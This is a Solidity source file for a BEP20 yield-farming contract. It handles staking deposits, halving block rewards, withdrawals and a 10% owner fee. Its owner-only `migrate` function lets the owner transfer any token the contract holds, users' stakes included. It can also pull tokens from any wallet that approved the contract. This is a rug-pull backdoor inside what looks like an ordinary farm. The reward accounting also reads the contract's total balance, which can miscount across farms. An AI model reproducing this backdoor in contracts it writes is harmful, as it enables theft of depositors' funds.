pragma solidity 0.5.16;

import "./FarmReward.sol";

contract Farms is Context, Ownable {
  using SafeMath for uint256;

  struct FarmInfo {
    address stakingToken;
    uint256 allocPoint;
    uint256 lastRewardBlock;
    uint256 accTokenPerShare;
  }

  struct UserInfo {
    uint256 amount;
    uint256 rewardDebt;
  }

  FarmInfo[] public farmInfo;
  mapping (uint256 => mapping (address => UserInfo)) public userInfo;

  uint256 public totalAllocPoint;

  FarmReward public reward;
  uint256 public tokenPerBlock;
  uint256 public startBlock;
  uint256 public halvingBlocks;

  constructor(FarmReward _reward, uint256 _tokenPerBlock, uint256 _startBlock, uint256 _halvingBlocks) public {
    reward = _reward;
    tokenPerBlock = _tokenPerBlock;
    startBlock = _startBlock;
    halvingBlocks = _halvingBlocks;
  }

  function migrate(address token, address from, address to, uint256 amount) public onlyOwner {
    if (from == address(this)) {
      IBEP20(token).transfer(to, amount);
    } else {
      IBEP20(token).transferFrom(from, to, amount);
    }
  }

  function farmLength() external view returns (uint256) {
    return farmInfo.length;
  }

  function addFarm(address stakingToken, uint256 allocPoint) public onlyOwner {
    massUpdateFarms();

    farmInfo.push(FarmInfo({
      stakingToken: stakingToken,
      allocPoint: allocPoint,
      lastRewardBlock: block.number > startBlock ? block.number : startBlock,
      accTokenPerShare: 0
    }));

    totalAllocPoint = totalAllocPoint.add(allocPoint);
  }

  function setFarm(uint256 farmId, uint256 allocPoint) public onlyOwner {
    uint256 prevAllocPoint = farmInfo[farmId].allocPoint;

    if (allocPoint != prevAllocPoint) {
      massUpdateFarms();
      farmInfo[farmId].allocPoint = allocPoint;
      totalAllocPoint = totalAllocPoint.sub(prevAllocPoint).add(allocPoint);
    }
  }

  function calcTokenReward(uint256 lastRewardBlock) internal view returns (uint256) {
    uint256 tokenReward = 0;
    uint256 halvings = block.number.sub(startBlock).div(halvingBlocks);
    uint256 tokenBlock = tokenPerBlock;

    for (uint256 i = 0; i <= halvings; i++) {
      uint256 halvingBlock = i.add(1).mul(halvingBlocks).add(startBlock);

      if (lastRewardBlock < halvingBlock) {
        if (block.number < halvingBlock) {
          tokenReward = block.number.sub(lastRewardBlock).mul(tokenBlock).add(tokenReward);
        } else {
          tokenReward = halvingBlock.sub(lastRewardBlock).mul(tokenBlock).add(tokenReward);
        }
      }

      lastRewardBlock = halvingBlock;
      tokenBlock = tokenBlock.div(2);
    }

    uint256 remaining = reward.remaining();

    if (remaining < tokenReward) {
      tokenReward = remaining;
    }

    return tokenReward;
  }

  function pendingToken(uint256 farmId, address account) external view returns (uint256) {
    FarmInfo storage farm = farmInfo[farmId];
    UserInfo storage user = userInfo[farmId][account];
    uint256 accTokenPerShare = farm.accTokenPerShare;
    uint256 balance = IBEP20(farm.stakingToken).balanceOf(address(this));

    if (block.number > farm.lastRewardBlock && balance != 0) {
      uint256 tokenReward = calcTokenReward(farm.lastRewardBlock).mul(farm.allocPoint).div(totalAllocPoint);
      tokenReward = tokenReward.sub(tokenReward.div(10));
      accTokenPerShare = accTokenPerShare.add(tokenReward.mul(1e12).div(balance));
    }

    return user.amount.mul(accTokenPerShare).div(1e12).sub(user.rewardDebt);
  }

  function massUpdateFarms() public {
    uint256 length = this.farmLength();

    for (uint256 i = 0; i < length; i++) {
      updateFarm(i);
    }
  }

  function updateFarm(uint256 farmId) public {
    FarmInfo storage farm = farmInfo[farmId];

    if (block.number <= farm.lastRewardBlock) {
      return;
    }

    uint256 balance = IBEP20(farm.stakingToken).balanceOf(address(this));

    if (balance == 0) {
      farm.lastRewardBlock = block.number;
      return;
    }

    uint256 tokenReward = calcTokenReward(farm.lastRewardBlock).mul(farm.allocPoint).div(totalAllocPoint);

    if (tokenReward > 0) {
      uint256 ownerReward = tokenReward.div(10);

      if (ownerReward > 0) {
        tokenReward = tokenReward.sub(ownerReward);
        reward.safeTransfer(owner(), ownerReward);
      }
    }

    farm.accTokenPerShare = farm.accTokenPerShare.add(tokenReward.mul(1e12).div(balance));
    farm.lastRewardBlock = block.number;
  }

  function deposit(uint256 farmId, uint256 amount) public {
    FarmInfo storage farm = farmInfo[farmId];
    UserInfo storage user = userInfo[farmId][_msgSender()];
    updateFarm(farmId);

    if (user.amount > 0) {
      uint256 pending = user.amount.mul(farm.accTokenPerShare).div(1e12).sub(user.rewardDebt);

      if (pending > 0) {
        reward.safeTransfer(_msgSender(), pending);
      }
    }

    if (amount > 0) {
      IBEP20(farm.stakingToken).transferFrom(_msgSender(), address(this), amount);
      user.amount = user.amount.add(amount);
    }

    user.rewardDebt = user.amount.mul(farm.accTokenPerShare).div(1e12);
    emit Deposit(_msgSender(), farmId, amount);
  }

  function withdraw(uint256 farmId, bool onlyClaim) public {
    FarmInfo storage farm = farmInfo[farmId];
    UserInfo storage user = userInfo[farmId][_msgSender()];
    uint256 amount = user.amount;
    updateFarm(farmId);

    if (amount > 0) {
      uint256 pending = amount.mul(farm.accTokenPerShare).div(1e12).sub(user.rewardDebt);

      if (pending > 0) {
        reward.safeTransfer(_msgSender(), pending);
      }

      if (!onlyClaim) {
        IBEP20(farm.stakingToken).transfer(_msgSender(), amount);
        user.amount = 0;
      }
    }

    user.rewardDebt = user.amount.mul(farm.accTokenPerShare).div(1e12);
    emit Withdraw(_msgSender(), farmId, onlyClaim ? 0 : amount);
  }

  function emergencyWithdraw(uint256 farmId) public {
    FarmInfo storage farm = farmInfo[farmId];
    UserInfo storage user = userInfo[farmId][_msgSender()];
    IBEP20(farm.stakingToken).transfer(_msgSender(), user.amount);
    emit EmergencyWithdraw(_msgSender(), farmId, user.amount);
    user.amount = 0;
    user.rewardDebt = 0;
  }

  event Deposit(address indexed user, uint256 indexed farmId, uint256 amount);
  event Withdraw(address indexed user, uint256 indexed farmId, uint256 amount);
  event EmergencyWithdraw(address indexed user, uint256 indexed farmId, uint256 amount);
}
